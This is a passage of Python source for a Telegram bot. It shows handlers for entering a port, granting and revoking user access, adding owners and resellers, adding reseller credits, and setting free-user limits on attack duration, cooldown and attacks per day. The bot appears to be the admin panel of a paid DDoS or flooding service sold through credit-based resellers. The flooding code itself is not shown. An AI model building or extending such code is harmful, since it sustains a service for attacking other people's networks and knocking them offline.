            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐏𝐎𝐑𝐓')}\n{bold('𝐏𝐨𝐫𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "add_user_id":
        try:
            new_user_id = int(text.strip())
            added_by = temp_data[user_id].get("added_by", user_id)
            
            if is_reseller(added_by):
                has_credits, remaining = deduct_reseller_credit(added_by)
                if not has_credits:
                    await update.message.reply_text(
                        f"❌ {bold('𝐈𝐍𝐒𝐔𝐅𝐅𝐈𝐂𝐈𝐄𝐍𝐓 𝐂𝐑𝐄𝐃𝐈𝐓𝐒')}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"{bold('𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝟏𝟎 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐭𝐨 𝐚𝐝𝐝 𝐚 𝐮𝐬𝐞𝐫')}.\n"
                        f"{bold('𝐘𝐨𝐮𝐫 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐫𝐞𝐝𝐢𝐭𝐬')}: {remaining}\n"
                        f"{bold('𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐨𝐰𝐧𝐞𝐫 𝐭𝐨 𝐚𝐝𝐝 𝐦𝐨𝐫𝐞 𝐜𝐫𝐞𝐝𝐢𝐭𝐬')}.\n\n"
                        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                    )
                    del temp_data[user_id]
                    return
            
            temp_data[user_id]["new_user_id"] = new_user_id
            temp_data[user_id]["step"] = "add_user_days"

            keyboard = [
                [InlineKeyboardButton(bold("𝟏 𝐃𝐚𝐲"), callback_data="days_1"),
                 InlineKeyboardButton(bold("𝟐 𝐃𝐚𝐲𝐬"), callback_data="days_2"),
                 InlineKeyboardButton(bold("𝟑 𝐃𝐚𝐲𝐬"), callback_data="days_3")],
                [InlineKeyboardButton(bold("𝟒 𝐃𝐚𝐲𝐬"), callback_data="days_4"),
                 InlineKeyboardButton(bold("𝟕 𝐃𝐚𝐲𝐬"), callback_data="days_7"),
                 InlineKeyboardButton(bold("𝟑𝟎 𝐃𝐚𝐲𝐬"), callback_data="days_30")],
                [InlineKeyboardButton(bold("𝐋𝐢𝐟𝐞𝐭𝐢𝐦𝐞"), callback_data="days_0"),
                 InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                f"➕ {bold('𝐀𝐃𝐃 𝐔𝐒𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟐/𝟐')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✓ {bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{new_user_id}`\n\n"
                f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}:\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "remove_user_id":
        try:
            user_to_remove = int(text.strip())
            user_to_remove_str = str(user_to_remove)

            removed = False

            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True

            pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
            save_pending_users(pending_users)

            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)

            if removed:
                reply_markup = get_main_keyboard(user_id)
                await update.message.reply_text(
                    f"✓ {bold('𝐔𝐒𝐄𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{user_to_remove}`\n"
                    f"{bold('𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐛𝐲')}: `{user_id}`\n\n"
                    f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                    reply_markup=reply_markup
                )

                try:
                    await context.bot.send_message(
                        chat_id=user_to_remove,
                        text=f"🚫 {bold('𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐘𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐯𝐨𝐤𝐞𝐝')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                    )
                except:
                    pass
            else:
                await update.message.reply_text(f"❌ {bold('𝐔𝐒𝐄𝐑 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃')} `{user_to_remove}` {bold('𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "owner_add_id":
        try:
            new_owner_id = int(text.strip())
            temp_data[user_id]["new_owner_id"] = new_owner_id
            temp_data[user_id]["step"] = "owner_add_username"

            await update.message.reply_text(
                f"👑 {bold('𝐀𝐃𝐃 𝐎𝐖𝐍𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟐/𝟐')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✓ {bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{new_owner_id}`\n\n"
                f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}:\n\n{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `john`\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "owner_add_username":
        username = text.strip()
        new_owner_id = temp_data[user_id]["new_owner_id"]

        if str(new_owner_id) in owners:
            await update.message.reply_text(f"❌ {bold('𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐚𝐧 𝐨𝐰𝐧𝐞𝐫')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            del temp_data[user_id]
            return

        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)

        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)

        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text=f"👑 {bold('𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒')}!\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐚𝐝𝐝𝐞𝐝 𝐚𝐬 𝐚𝐧 𝐨𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐛𝐨𝐭')}!\n{bold('𝐘𝐨𝐮 𝐧𝐨𝐰 𝐡𝐚𝐯𝐞 𝐟𝐮𝐥𝐥 𝐚𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐚𝐥𝐥 𝐚𝐝𝐦𝐢𝐧 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✓ {bold('𝐎𝐖𝐍𝐄𝐑 𝐀𝐃𝐃𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐎𝐰𝐧𝐞𝐫 𝐈𝐃')}: `{new_owner_id}`\n"
            f"{bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: @{username}\n"
            f"{bold('𝐀𝐝𝐝𝐞𝐝 𝐛𝐲')}: `{user_id}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    elif step == "owner_remove_id":
        try:
            owner_to_remove = int(text.strip())

            if str(owner_to_remove) not in owners:
                await update.message.reply_text(f"❌ {bold('𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐚𝐧 𝐨𝐰𝐧𝐞𝐫')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                del temp_data[user_id]
                return

            if owners[str(owner_to_remove)].get("is_primary", False):
                await update.message.reply_text(f"❌ {bold('𝐂𝐚𝐧𝐧𝐨𝐭 𝐫𝐞𝐦𝐨𝐯𝐞 𝐩𝐫𝐢𝐦𝐚𝐫𝐲 𝐨𝐰𝐧𝐞𝐫')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                del temp_data[user_id]
                return

            removed_username = owners[str(owner_to_remove)].get("username", "")
            del owners[str(owner_to_remove)]
            save_owners(owners)

            try:
                await context.bot.send_message(
                    chat_id=owner_to_remove,
                    text=f"⚠️ {bold('𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐘𝐨𝐮𝐫 𝐨𝐰𝐧𝐞𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐯𝐨𝐤𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✓ {bold('𝐎𝐖𝐍𝐄𝐑 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐎𝐰𝐧𝐞𝐫 𝐈𝐃')}: `{owner_to_remove}`\n"
                f"{bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: @{removed_username}\n"
                f"{bold('𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐛𝐲')}: `{user_id}`\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "reseller_add_id":
        try:
            reseller_id = int(text.strip())
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "reseller_add_credits"

            keyboard = [
                [InlineKeyboardButton(bold("𝟓𝟎"), callback_data="credits_50"),
                 InlineKeyboardButton(bold("𝟏𝟎𝟎"), callback_data="credits_100"),
                 InlineKeyboardButton(bold("𝟐𝟎𝟎"), callback_data="credits_200")],
                [InlineKeyboardButton(bold("𝟓𝟎𝟎"), callback_data="credits_500"),
                 InlineKeyboardButton(bold("𝟏𝟎𝟎𝟎"), callback_data="credits_1000"),
                 InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                f"💰 {bold('𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟐/𝟑')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✓ {bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{reseller_id}`\n\n"
                f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐢𝐧𝐢𝐭𝐢𝐚𝐥 𝐜𝐫𝐞𝐝𝐢𝐭𝐬')}:\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "reseller_add_username":
        username = text.strip()
        reseller_id = temp_data[user_id]["reseller_id"]
        credits = temp_data[user_id]["credits"]

        if str(reseller_id) in resellers:
            await update.message.reply_text(f"❌ {bold('𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            del temp_data[user_id]
            return

        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄",
            "total_added": 0
        }
        save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=f"💰 {bold('𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒')}!\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐚𝐝𝐝𝐞𝐝 𝐚𝐬 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫')}!\n{bold('𝐈𝐧𝐢𝐭𝐢𝐚𝐥 𝐜𝐫𝐞𝐝𝐢𝐭𝐬')}: {credits}\n\n{bold('𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐦𝐚𝐧𝐚𝐠𝐞 𝐮𝐬𝐞𝐫𝐬 (𝟏𝟎 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐝𝐞𝐝𝐮𝐜𝐭𝐞𝐝 𝐩𝐞𝐫 𝐮𝐬𝐞𝐫)')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✓ {bold('𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐀𝐃𝐃𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐈𝐃')}: `{reseller_id}`\n"
            f"{bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: @{username}\n"
            f"{bold('𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: {credits}\n"
            f"{bold('𝐀𝐝𝐝𝐞𝐝 𝐛𝐲')}: `{user_id}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    elif step == "reseller_remove_id":
        try:
            reseller_to_remove = int(text.strip())

            if str(reseller_to_remove) not in resellers:
                await update.message.reply_text(f"❌ {bold('𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                del temp_data[user_id]
                return

            removed_username = resellers[str(reseller_to_remove)].get("username", "")
            del resellers[str(reseller_to_remove)]
            save_resellers(resellers)

            try:
                await context.bot.send_message(
                    chat_id=reseller_to_remove,
                    text=f"⚠️ {bold('𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍')}\n━━━━━━━━━━━━━━━━━━━━━━\n{bold('𝐘𝐨𝐮𝐫 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐯𝐨𝐤𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✓ {bold('𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐈𝐃')}: `{reseller_to_remove}`\n"
                f"{bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: @{removed_username}\n"
                f"{bold('𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐛𝐲')}: `{user_id}`\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n{bold('𝐔𝐬𝐞𝐫 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃')}:\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "add_reseller_credits_id":
        try:
            reseller_id = int(text.strip())
            if str(reseller_id) not in resellers:
                await update.message.reply_text(f"❌ {bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                del temp_data[user_id]
                return
            
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "add_reseller_credits_amount"
            
            await update.message.reply_text(
                f"💰 {bold('𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐂𝐑𝐄𝐃𝐈𝐓𝐒')} - {bold('𝐒𝐓𝐄𝐏 𝟐/𝟐')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐈𝐃')}: `{reseller_id}`\n"
                f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐫𝐞𝐝𝐢𝐭𝐬')}: {resellers[str(reseller_id)]['credits']}\n\n"
                f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐚𝐦𝐨𝐮𝐧𝐭 𝐨𝐟 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐭𝐨 𝐚𝐝𝐝')}:\n\n"
                f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `50`\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )
            
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐔𝐒𝐄𝐑 𝐈𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "add_reseller_credits_amount":
        try:
            amount = int(text.strip())
            if amount <= 0:
                await update.message.reply_text(f"❌ {bold('𝐀𝐦𝐨𝐮𝐧𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                return
            
            reseller_id = temp_data[user_id]["reseller_id"]
            resellers[str(reseller_id)]['credits'] = resellers[str(reseller_id)].get('credits', 0) + amount
            save_resellers(resellers)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✓ {bold('𝐂𝐑𝐄𝐃𝐈𝐓𝐒 𝐀𝐃𝐃𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫')}: `{reseller_id}`\n"
                f"{bold('𝐀𝐦𝐨𝐮𝐧𝐭 𝐚𝐝𝐝𝐞𝐝')}: {amount}\n"
                f"{bold('𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞')}: {resellers[str(reseller_id)]['credits']}\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            
            try:
                await context.bot.send_message(
                    chat_id=reseller_id,
                    text=f"💰 {bold('𝐂𝐑𝐄𝐃𝐈𝐓𝐒 𝐀𝐃𝐃𝐄𝐃')}!\n━━━━━━━━━━━━━━━━━━━━━━\n{amount} {bold('𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐚𝐝𝐝𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭')}.\n{bold('𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞')}: {resellers[str(reseller_id)]['credits']}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )
            except:
                pass
            
            del temp_data[user_id]
            
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐀𝐌𝐎𝐔𝐍𝐓')}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "set_free_duration":
        try:
            duration = int(text.strip())
            if duration <= 0:
                await update.message.reply_text(f"❌ {bold('𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞')}")
                return
            
            free_settings["max_duration"] = duration
            save_free_settings(free_settings)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐞𝐰 𝐦𝐚𝐱 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {duration}s\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑')}")

    elif step == "set_free_cooldown":
        try:
            cooldown = int(text.strip())
            if cooldown <= 0:
                await update.message.reply_text(f"❌ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞')}")
                return
            
            free_settings["cooldown"] = cooldown
            save_free_settings(free_settings)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐞𝐰 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {cooldown}s\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑')}")

    elif step == "set_free_limit":
        try:
            limit = int(text.strip())
            if limit <= 0:
                await update.message.reply_text(f"❌ {bold('𝐋𝐢𝐦𝐢𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞')}")
                return
            
            free_settings["max_attacks_per_day"] = limit
            save_free_settings(free_settings)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐞𝐰 𝐝𝐚𝐢𝐥𝐲 𝐥𝐢𝐦𝐢𝐭')}: {limit} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬/𝐝𝐚𝐲\n\n"
